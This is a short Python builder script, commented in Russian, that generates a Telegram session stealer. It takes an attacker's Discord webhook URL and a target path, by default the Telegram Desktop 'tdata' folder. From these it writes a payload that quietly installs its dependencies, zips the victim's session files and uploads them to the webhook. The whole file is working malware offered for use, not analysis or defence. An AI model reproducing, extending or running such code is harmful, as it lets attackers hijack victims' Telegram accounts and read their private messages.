import os

def create_python_file(hook, user):
    # Шаблон кода для нового Python файла
    template = f"""
import os

# depencies check
discord_path = os.path.join(os.path.expanduser('~'), 'AppData\\\\Local\\\\Packages\\\\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\\\\LocalCache\\\\local-packages\\\\Python311\\\\site-packages\\\\discord_webhook')
discord_status = os.path.isdir(discord_path)

for i in range(1):
    if discord_status == True:
        continue
    else:
        os.system("pip install discord_webhook zip_files")
# depencies check end

# sources
from discord_webhook import DiscordWebhook, DiscordEmbed
from zipfile import ZipFile, ZIP_DEFLATED
import zipfile

user = r'{user}'  # Используем raw строку для пути
hook = "{hook}"
# sources end

# tdata take + archivation
with zipfile.ZipFile("tdata.zip", 'w', ZIP_DEFLATED, compresslevel=9) as archive:
    for root, dirs, files in os.walk(user):
        for file in files:
            file_path = os.path.join(root, file)
            archive.write(file_path, os.path.relpath(file_path, os.path.join(user, '..')))
# tdata take + archivation end

# discord send
def discord_send():
    webhook = DiscordWebhook(url=hook)

    with open("tdata.zip", 'rb') as f:
        webhook.add_file(file=f.read(), filename='tdata_session.zip')
    webhook.execute()

discord_send()
# discord send end
    """

    # Создание нового файла
    with open('generated_file.py', 'w') as f:
        f.write(template)

def main():
    # Запрашиваем у пользователя данные для переменных
    hook = input("Введите URL вебхука (hook): ")

    # Путь по умолчанию
    default_user = r'home, AppData\\Roaming\\Telegram Desktop\\tdata'
    
    # Запрашиваем у пользователя путь
    user = input(f"Введите путь к директории пользователя (user) или нажмите Enter для пути по умолчанию [{default_user}]: ")

    # Если пользователь ничего не ввел, используем значение по умолчанию
    if not user:
        user = default_user

    # Создаем Python файл
    create_python_file(hook, user)
    print("Файл 'generated_file.py' создан!")

if __name__ == "__main__":
    main()